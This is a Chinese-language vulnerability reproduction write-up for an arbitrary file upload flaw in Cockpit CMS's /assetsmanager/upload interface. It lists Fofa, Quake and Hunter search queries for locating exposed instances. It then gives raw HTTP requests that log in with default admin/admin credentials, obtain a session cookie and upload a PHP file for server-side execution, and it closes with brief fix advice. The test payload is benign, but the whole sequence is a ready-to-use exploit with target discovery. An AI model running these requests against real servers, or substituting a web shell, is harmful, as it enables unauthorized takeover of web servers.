**漏洞描述**

cockpit系统assetsmanager/upload接口处存在任意文件上传漏洞。攻击者可通过该漏洞在服务端任意上传代码并获取服务器权限，进而控制整个Web服务器。

**空间测绘**

测绘语法：

```bash
Fofa：title="Authenticate Please!"
quake：title:"Authenticate Please!"
hunter：web.title="Authenticate Please!"
```

**漏洞复现**

登录界面如下：

![图片](cockpit%E7%B3%BB%E7%BB%9Fassetsmanager-upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640.jpeg)

1.执行poc进行csrf信息获取，并获取cookie，再上传访问得到结果：

```yaml
GET /auth/login?to=/ HTTP/1.1
Host: xxx.com
Content-Length: 2
```

![图片](cockpit%E7%B3%BB%E7%BB%9Fassetsmanager-upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640-1716174331974-3.png)

2.使用刚才上一步获取到的jwt获取cookie：

```yaml

POST /auth/check HTTP/1.1
Host: xxx.com
Content-Type: application/json
User-Agent: Mozilla/5.0 
Content-Length: 157

{"auth":{"user":"admin","password":"admin"},"csfr":"csfr"}
```

![图片](cockpit%E7%B3%BB%E7%BB%9Fassetsmanager-upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640-1716174342157-6.png)

3.上传文件：

```yaml
POST /assetsmanager/upload HTTP/1.1
Host: xxx.com
Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
Cookie: mysession=123451234512345123451234512345123
User-Agent: Mozilla/5.0 
Content-Length: 357

-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="files[]"; filename="BE1a3e.php"
Content-Type: text/php

<?php echo "12131231231234e80test";unlink(__FILE__);?>
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="folder"


-----------------------------36D28FBc36bd6feE7Fb3--
```

![图片](cockpit%E7%B3%BB%E7%BB%9Fassetsmanager-upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640-1716174352929-9.png)

4.访问 url+/storage/uploads/+path 验证上传结果：

![图片](cockpit%E7%B3%BB%E7%BB%9Fassetsmanager-upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/640-1716174356506-12.png)

**0x04 修复意见**

1、请联系厂商进行修复。 

2、在后端限制允许上传的文件类型或文件内容。 

3、设置白名单访问。
